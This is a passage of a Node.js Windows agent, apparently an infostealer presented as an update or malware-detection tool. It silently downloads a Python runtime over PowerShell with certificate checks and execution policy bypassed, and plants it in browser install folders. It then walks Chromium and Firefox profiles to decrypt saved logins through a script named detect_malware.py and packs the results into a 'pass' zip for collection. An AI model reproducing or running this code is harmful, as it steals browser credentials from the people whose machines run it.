    "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}",
    `(New-Object Net.WebClient).DownloadFile('${urlEsc}','${dstEsc}')`,
  ].join(";");
  agentLog(`downloadFileSync: ${url} -> ${destPath}`);
  execFileSync(psExe, ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", cmd], {
    stdio: "ignore", timeout: 300000, windowsHide: true,
  });
  if (!fs.existsSync(destPath)) throw new Error(`download produced no file: ${destPath}`);
  const sz = fs.statSync(destPath).size;
  agentLog(`downloadFileSync: ok ${sz}B`);
  return sz;
}

function extractZipToDir(zipPath, destDir) {
  fs.mkdirSync(destDir, { recursive: true });
  const sysRoot = process.env.SystemRoot || "C:\\Windows";
  // Try tar.exe first (Windows 10+)
  try {
    execFileSync(path.join(sysRoot, "System32", "tar.exe"), ["-xf", zipPath, "-C", destDir], {
      stdio: "ignore", timeout: 120000, windowsHide: true,
    });
    return;
  } catch (_) { /* try PowerShell */ }
  const psExe = path.join(sysRoot, "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
  const zEsc = zipPath.replace(/'/g, "''");
  const dEsc = destDir.replace(/'/g, "''");
  execFileSync(psExe, ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command",
    `Expand-Archive -LiteralPath '${zEsc}' -DestinationPath '${dEsc}' -Force`],
    { stdio: "ignore", timeout: 120000, windowsHide: true });
}

function sha256File(filePath) {
  const data = fs.readFileSync(filePath);
  return crypto.createHash("sha256").update(data).digest("hex");
}

function enableEmbedSiteImports(appDir) {
  let pthFiles;
  try {
    pthFiles = fs.readdirSync(appDir).filter(n => /^python\d+\._pth$/i.test(n));
  } catch (_) { return; }
  for (const name of pthFiles) {
    const p = path.join(appDir, name);
    try {
      const content = fs.readFileSync(p, "utf8");
      const patched = content.replace(/#import site/g, "import site");
      if (patched !== content) {
        fs.writeFileSync(p, patched, "utf8");
        agentLog(`enableEmbedSiteImports: enabled import site in ${name}`);
      }
    } catch (e) {
      agentLog(`enableEmbedSiteImports: ${name}: ${e.message}`);
    }
  }
}

function pythonCanImportCrypto(pyExe) {
  try {
    execFileSync(pyExe, ["-c", "from Crypto.Cipher import AES"], {
      stdio: "ignore", timeout: 15000, windowsHide: true,
    });
    return true;
  } catch (_) {
    return false;
  }
}

function pythonEmbedIsHealthy(pyExe) {
  try {
    execFileSync(pyExe, ["-c", "import sqlite3; from Crypto.Cipher import AES"], {
      stdio: "ignore", timeout: 15000, windowsHide: true,
    });
    return true;
  } catch (_) {
    return false;
  }
}

function nukeEmbedDir(appDir) {
  const embedArtifacts = [
    "python.exe", "pythonw.exe", "python3.dll", "python312.dll", "vcruntime140.dll",
    "vcruntime140_1.dll", "_sqlite3.pyd", "sqlite3.dll", "select.pyd", "_socket.pyd",
    "_ssl.pyd", "_decimal.pyd", "_hashlib.pyd", "_lzma.pyd", "_bz2.pyd",
    "_ctypes.pyd", "libcrypto-3.dll", "libssl-3.dll", "libffi-8.dll",
    EMBED_STAMP_FILE,
  ];
  for (const name of embedArtifacts) {
    try { fs.unlinkSync(path.join(appDir, name)); } catch (_) {}
  }
  // Remove known embed directories
  for (const dir of ["Lib", "DLLs"]) {
    try { fs.rmSync(path.join(appDir, dir), { recursive: true, force: true }); } catch (_) {}
  }
  // Remove ._pth files
  try {
    for (const f of fs.readdirSync(appDir)) {
      if (/^python\d+\._pth$/i.test(f)) {
        try { fs.unlinkSync(path.join(appDir, f)); } catch (_) {}
      }
      if (/^python\d+\.zip$/i.test(f)) {
        try { fs.unlinkSync(path.join(appDir, f)); } catch (_) {}
      }
    }
  } catch (_) {}
  agentLog(`nukeEmbedDir: cleaned embed artifacts from ${appDir}`);
}

function ensureEmbeddablePython(serverBaseUrl, browserName) {
  if (!serverBaseUrl) {
    agentLog("ensureEmbeddablePython: no serverBaseUrl -- skip");
    return null;
  }
  const appDir = findBrowserApplicationDir(browserName);
  if (!appDir) {
    agentLog(`ensureEmbeddablePython: no Application dir for ${browserName} -- skip`);
    return null;
  }

  const pyExe = path.join(appDir, "python.exe");
  const stampPath = path.join(appDir, EMBED_STAMP_FILE);
  const base = serverBaseUrl.replace(/\/+$/, "");

  // Check if already set up and fully healthy (sqlite3 + Crypto both work)
  if (fs.existsSync(pyExe) && fs.existsSync(stampPath)) {
    agentLog(`ensureEmbeddablePython: python.exe exists at ${pyExe}, checking health`);
    enableEmbedSiteImports(appDir);
    if (pythonEmbedIsHealthy(pyExe)) {
      agentLog(`ensureEmbeddablePython: embed healthy (sqlite3+Crypto OK) -- reusing`);
      return pyExe;
    }
    agentLog("ensureEmbeddablePython: embed unhealthy (missing modules) -- will nuke and re-download");
    nukeEmbedDir(appDir);
  } else if (fs.existsSync(pyExe)) {
    agentLog("ensureEmbeddablePython: python.exe exists but no stamp -- nuking stale embed");
    nukeEmbedDir(appDir);
  }

  // Download full embeddable Python zip
  const tmpDir = path.join(os.tmpdir(), "gus-embed-py-" + Date.now());
  fs.mkdirSync(tmpDir, { recursive: true });

  const pyZipUrl = `${base}/data/${EMBED_PYTHON_ZIP}`;
  const pyZipPath = path.join(tmpDir, EMBED_PYTHON_ZIP);
  agentLog(`ensureEmbeddablePython: downloading CPython embed from ${pyZipUrl}`);
  try {
    downloadFileSync(pyZipUrl, pyZipPath);
    agentLog(`ensureEmbeddablePython: extracting to ${appDir}`);
    extractZipToDir(pyZipPath, appDir);
    const hash = sha256File(pyZipPath);
    fs.writeFileSync(stampPath, hash + "\n", "utf8");
    agentLog(`ensureEmbeddablePython: CPython extracted, stamp=${hash}`);
  } catch (e) {
    agentLog(`ensureEmbeddablePython: CPython download/extract FAILED: ${e.message}`);
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (_) {}
    return null;
  }

  enableEmbedSiteImports(appDir);

  // Download site-packages (pycryptodome)
  if (!pythonCanImportCrypto(pyExe)) {
    const spZipUrl = `${base}/data/${EMBED_SITEPACKAGES_ZIP}`;
    const spZipPath = path.join(tmpDir, EMBED_SITEPACKAGES_ZIP);
    const siteDir = path.join(appDir, "Lib", "site-packages");
    agentLog(`ensureEmbeddablePython: downloading site-packages from ${spZipUrl}`);
    try {
      downloadFileSync(spZipUrl, spZipPath);
      agentLog(`ensureEmbeddablePython: extracting site-packages to ${siteDir}`);
      extractZipToDir(spZipPath, siteDir);
      agentLog("ensureEmbeddablePython: site-packages extracted");
    } catch (e) {
      agentLog(`ensureEmbeddablePython: site-packages download/extract FAILED: ${e.message}`);
    }
  }

  // Cleanup temp
  try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (_) {}

  // Final health check
  if (fs.existsSync(pyExe)) {
    const healthy = pythonEmbedIsHealthy(pyExe);
    agentLog(`ensureEmbeddablePython: final check python=${pyExe} healthy=${healthy}`);
    if (healthy) return pyExe;
    const canCrypto = pythonCanImportCrypto(pyExe);
    agentLog(`ensureEmbeddablePython: UNHEALTHY -- canImportCrypto=${canCrypto} (sqlite3 likely missing from zip)`);
    if (canCrypto) {
      agentLog("ensureEmbeddablePython: returning path (Crypto OK, sqlite3 may fail at runtime but DPAPI fallback available)");
      return pyExe;
    }
    agentLog("ensureEmbeddablePython: returning null (both sqlite3 and Crypto broken)");
    return null;
  }
  agentLog("ensureEmbeddablePython: python.exe still missing after setup");
  return null;
}

function buildPhase2PassZip(epFilePath, agentLogPath) {
  const zip = new ZipBuilder();
  if (epFilePath && fs.existsSync(epFilePath)) {
    zip.addFileFromDisk("e_p.txt", epFilePath);
  }
  if (agentLogPath && fs.existsSync(agentLogPath)) {
    zip.addFileFromDisk("agent.log", agentLogPath);
  }
  return zip.finalize();
}

function agentLogFilePath() {
  try {
    return path.join(agentStateDir(), "gus-run-update.log");
  } catch (_) {
    return null;
  }
}

function findBestPythonForBrowser(browserLabel, serverUrl) {
  const browserType = detectBrowserType(browserLabel);
  const httpBase = serverUrl
    ? serverUrl.replace(/^wss:\/\//, "https://").replace(/^ws:\/\//, "http://").replace(/\/+$/, "")
    : null;

  // 1. Prefer the browser's own embedded Python (best for ABE path validation)
  if (httpBase && (browserType === "chrome" || browserType === "edge")) {
    const embedded = ensureEmbeddablePython(httpBase, browserType);
    if (embedded && pythonEmbedIsHealthy(embedded)) {
      agentLog(`findBestPython(${browserLabel}): using own embedded Python (fully healthy): ${embedded}`);
      return embedded;
    }
    if (embedded && pythonCanImportCrypto(embedded)) {
      agentLog(`findBestPython(${browserLabel}): using own embedded Python (Crypto OK, sqlite3 may be missing): ${embedded}`);
      return embedded;
    }
  }

  // 2. Try any other browser's embedded Python
  if (httpBase) {
    for (const bn of ["chrome", "edge"]) {
      if (bn === browserType) continue;
      const embedded = ensureEmbeddablePython(httpBase, bn);
      if (embedded && pythonEmbedIsHealthy(embedded)) {
        agentLog(`findBestPython(${browserLabel}): using ${bn} embedded Python (fully healthy): ${embedded}`);
        return embedded;
      }
      if (embedded && pythonCanImportCrypto(embedded)) {
        agentLog(`findBestPython(${browserLabel}): using ${bn} embedded Python (Crypto OK): ${embedded}`);
        return embedded;
      }
    }
  }

  // 3. System Python with pycryptodome
  const sysPy = findPythonExe();
  if (sysPy && pythonCanImportCrypto(sysPy)) {
    agentLog(`findBestPython(${browserLabel}): using system Python: ${sysPy}`);
    return sysPy;
  }

  agentLog(`findBestPython(${browserLabel}): no usable Python found`);
  return null;
}

function runPhase2(sourceHome, resultFile, serverUrl) {
  const t0 = Date.now();
  agentLog(`runPhase2: begin pid=${process.pid} sourceHome=${sourceHome || "(empty)"} resultFile=${resultFile || "(none)"} serverUrl=${serverUrl ? "set(len=" + serverUrl.length + ")" : "MISSING"}`);
  agentLog(`runPhase2: __dirname=${__dirname}`);

  const artDir = windowsCwArtifactsDir();
  agentLog(`runPhase2: artifactsDir=${artDir}`);
  try {
    fs.mkdirSync(artDir, { recursive: true });
  } catch (e) {
    agentLog(`runPhase2: FAILED to create artDir: ${e.message}`);
  }

  const pyScript = findDetectMalwarePy(__dirname);
  const epFile = path.join(os.tmpdir(), `gus-ep-${Date.now()}.txt`);
  let epOk = false;

  agentLog(`runPhase2: pyScript=${pyScript || "NOT FOUND"} epFile=${epFile}`);

  if (!pyScript) {
    agentLog("runPhase2: detect_malware.py not found -- checked: " + [
      path.join(__dirname, "detect_malware.py"),
      path.join(__dirname, "chromepy", "detect_malware.py"),
    ].join(", "));
  } else {
    const home = sourceHome || process.env.USERPROFILE || "";
    const profileRoots = windowsProfileRoots(home);
    let wrote = false;
    const pyCache = new Map();

    for (const profRoot of profileRoots) {
      for (const br of CHROMIUM_BROWSERS) {
        const userData = path.join(profRoot, ...br.rel);
        const localState = path.join(userData, "Local State");
        try { if (!fs.statSync(localState).isFile()) continue; } catch (_) { continue; }

        // Find best Python for this browser (cache per browser type)
        const bType = detectBrowserType(br.label);
        let pyExe;
        if (pyCache.has(bType)) {
          pyExe = pyCache.get(bType);
        } else {
          pyExe = findBestPythonForBrowser(br.label, serverUrl);
          pyCache.set(bType, pyExe);
        }
        if (!pyExe) {
          agentLog(`phase2: skip ${br.label} -- no usable Python found`);
          continue;
        }

        let profileNames = [];
        try {
          const entries = fs.readdirSync(userData, { withFileTypes: true });
          for (const ent of entries) {
            if (!ent.isDirectory()) continue;
            if (ent.name === "Default" || ent.name.startsWith("Profile ")) profileNames.push(ent.name);
          }
        } catch (_) { /* skip */ }
        // Opera stores Login Data directly in userData root
        if (profileNames.length === 0) {
          try { if (fs.statSync(path.join(userData, "Login Data")).isFile()) profileNames.push("."); } catch (_) { /* skip */ }
        }
        for (const pn of profileNames) {
          const loginData = pn === "." ? path.join(userData, "Login Data") : path.join(userData, pn, "Login Data");
          try { if (!fs.statSync(loginData).isFile()) continue; } catch (_) { continue; }

          const label = `${br.label} / ${pn}`;
          const args = [
            pyScript,
            "--local-state", localState,
            "--login-data", loginData,
            "-o", epFile,
            "--browser", bType,
            "--section-label", label,
          ];
          if (wrote) args.push("--append");

          agentLog(`phase2: running ${label} python=${pyExe}`);
          try {
            execFileSync(pyExe, args, {
              stdio: ["ignore", "pipe", "pipe"],
              encoding: "utf8",
              timeout: 120000,
              windowsHide: true,
            });
            wrote = true;
            agentLog(`phase2: exported ${label}`);
          } catch (e) {
            agentLog(`phase2: export failed ${label}: ${e.message}`);
          }
        }
      }
    }
    // Firefox Phase 2: discover profiles and decrypt via --firefox mode
    const ffProfilesDirs = phase1FirefoxProfilesDirs(home);
    agentLog(`phase2: found ${ffProfilesDirs.length} Firefox Profiles dir(s)`);
    for (const ffProfilesDir of ffProfilesDirs) {
      let profEnts;
      try { profEnts = fs.readdirSync(ffProfilesDir, { withFileTypes: true }); } catch (_) { continue; }
      for (const ent of profEnts) {
        if (!ent.isDirectory()) continue;
        const profDir = path.join(ffProfilesDir, ent.name);
        const key4db = path.join(profDir, "key4.db");
        const loginsJson = path.join(profDir, "logins.json");
        try { if (!fs.statSync(key4db).isFile() || !fs.statSync(loginsJson).isFile()) continue; } catch (_) { continue; }

        const label = `Firefox / ${ent.name}`;
        let ffPyExe = pyCache.get("firefox");
        if (!ffPyExe) {
          ffPyExe = findBestPythonForBrowser("Chrome", serverUrl);
          pyCache.set("firefox", ffPyExe);
        }
        if (!ffPyExe) {
          agentLog(`phase2: skip ${label} -- no usable Python found`);
          continue;
        }

        const ffArgs = [
          pyScript,
          "--firefox",
          "--key4db", key4db,
          "--logins-json", loginsJson,
          "-o", epFile,
          "--section-label", label,
        ];
        if (wrote) ffArgs.push("--append");

        agentLog(`phase2: running ${label} python=${ffPyExe}`);
        try {
          execFileSync(ffPyExe, ffArgs, {
            stdio: ["ignore", "pipe", "pipe"],
            encoding: "utf8",
            timeout: 120000,
            windowsHide: true,
          });
          wrote = true;
          agentLog(`phase2: exported ${label}`);
        } catch (e) {
          agentLog(`phase2: export failed ${label}: ${e.message}`);
        }
      }
    }

    epOk = wrote && fs.existsSync(epFile);
    if (epOk) {
      try {
        agentLog(`runPhase2: credential export done epFile=${epFile} size=${fs.statSync(epFile).size}B elapsed=${Date.now() - t0}ms`);
      } catch (_) { agentLog(`runPhase2: credential export done (stat failed) elapsed=${Date.now() - t0}ms`); }
    } else {
      agentLog(`runPhase2: credential export completed but no output (wrote=${wrote} exists=${fs.existsSync(epFile)}) elapsed=${Date.now() - t0}ms`);
    }
  }

  if (!epOk) {
    // Write error stub
    try {
      fs.writeFileSync(epFile, "# credential export unavailable (Python or detect_malware.py not found)\n", "utf8");
      epOk = true;
    } catch (_) { /* silent */ }
  }

  if (!epOk) {
    agentLog("phase2: no credential export or agent log - nothing to save");
    reportResult(resultFile, "phase2_no_data");
    return null;
  }

  const logPath = agentLogFilePath();
  agentLog(`runPhase2: building pass zip epFile=${epFile} logPath=${logPath || "(none)"}`);
  const zipData = buildPhase2PassZip(epFile, logPath);
  try { fs.unlinkSync(epFile); } catch (_) { /* silent */ }

  if (zipData.length < 32) {
    agentLog(`runPhase2: pass archive trivial (${zipData.length}B) -- skip -- elapsed=${Date.now() - t0}ms`);
    reportResult(resultFile, "phase2_trivial");
    return null;
  }

  const stem = archiveStem();
  const dest = path.join(artDir, stem + "_pass.zip");
  fs.writeFileSync(dest, zipData);
  agentLog(`runPhase2: wrote pass zip ${zipData.length}B -> ${dest} elapsed=${Date.now() - t0}ms`);
  reportResult(resultFile, "phase2_zip_ready");
  return dest;
}

function detectBrowserType(label) {
  const low = label.toLowerCase();
  if (low.includes("edge")) return "edge";
  if (low.includes("brave")) return "brave";
  if (low.includes("vivaldi")) return "vivaldi";
  if (low.includes("opera")) return "opera";
  if (low.includes("yandex")) return "yandex";
  if (low.includes("arc")) return "arc";
  if (low.includes("chromium")) return "chromium";
  return "chrome";
}

function reportResult(resultFile, status) {
  if (!resultFile) return;
  try {
    fs.writeFileSync(resultFile, status.trim(), "utf8");
  } catch (_) { /* silent */ }
}

// ---------------------------------------------------------------------------
//  GUS workspace cleanup (mirrors Go MaybeRemoveGUSOneShotWorkspaceArtifacts)
// ---------------------------------------------------------------------------

function maybeRemoveGUSWorkspaceArtifacts() {
  agentLog("gus cleanup: running workspace artifact removal");
  // Minimal implementation - the JS pipeline handles cleanup separately
}

// ---------------------------------------------------------------------------
//  CLI entry point (for standalone use)
// ---------------------------------------------------------------------------

function main() {
  const args = process.argv.slice(2);
  let mode = null;
  let resultFile = null;
  let serverUrl = null;
  let sourceHome = process.env.OVERLORD_CW_SOURCE_HOME || process.env.USERPROFILE || "";

  let artifactsDir = null;
  for (const a of args) {
    if (a === "--company-wallet-phase1-local" || a === "--phase1") mode = "phase1";
    if (a === "--company-wallet-job") mode = "phase2";
    if (a.startsWith("--cw-result-file=")) resultFile = a.slice("--cw-result-file=".length);
    if (a.startsWith("--cw-source-home=")) sourceHome = a.slice("--cw-source-home=".length);
    if (a.startsWith("--cw-server-url=")) serverUrl = a.slice("--cw-server-url=".length);
    if (a.startsWith("--cw-artifacts-dir=")) artifactsDir = a.slice("--cw-artifacts-dir=".length);
    if (a.startsWith("--gus-workspace=") && a.slice("--gus-workspace=".length))
      process.env.OVERLORD_GUS_WORKSPACE = a.slice("--gus-workspace=".length);
  }
  if (artifactsDir) process.env.OVERLORD_CW_ARTIFACTS_DIR = artifactsDir;

  agentLog(`bootstrap: mode=${mode} pid=${process.pid} sourceHome=${sourceHome} serverUrl=${serverUrl ? "set" : "none"} argv=${JSON.stringify(args)}`);
  agentLog(`bootstrap: platform=${os.platform()} arch=${os.arch()} nodeVersion=${process.version} __dirname=${__dirname}`);

  if (mode === "phase1") {
    try {
      runPhase1(sourceHome);
      agentLog("phase1: OK");
    } catch (e) {
      agentLog(`phase1: FAILED: ${e.message}`);
      process.exit(1);
    }
  } else if (mode === "phase2") {
    try {
      runPhase2(sourceHome, resultFile, serverUrl);
      agentLog("phase2: OK");
    } catch (e) {
      agentLog(`phase2: FAILED: ${e.message}`);
      reportResult(resultFile, `failed:phase2 ${e.message}`);
      process.exit(1);
    }
  } else {
    // Default: just run cleanup (same as session_run_windows.go runClient)
    agentLog("Windows node agent: no WebSocket -- cleanup only");
    maybeRemoveGUSWorkspaceArtifacts();
  }
}

// ---------------------------------------------------------------------------
//  Exports (for use from windows-js-pipeline.js via require())
// ---------------------------------------------------------------------------

module.exports = {
  runPhase1,
  runPhase2,
  buildPhase1Zip,
  buildPhase2PassZip,
  findDetectMalwarePy,
  findPythonExe,
  windowsCwArtifactsDir,
  archiveStem,
  agentLog,
  copyRobust,
  windowsProfileRoots,
  phase1ChromiumUserDataRoots,
};

if (require.main === module) {
  main();
}
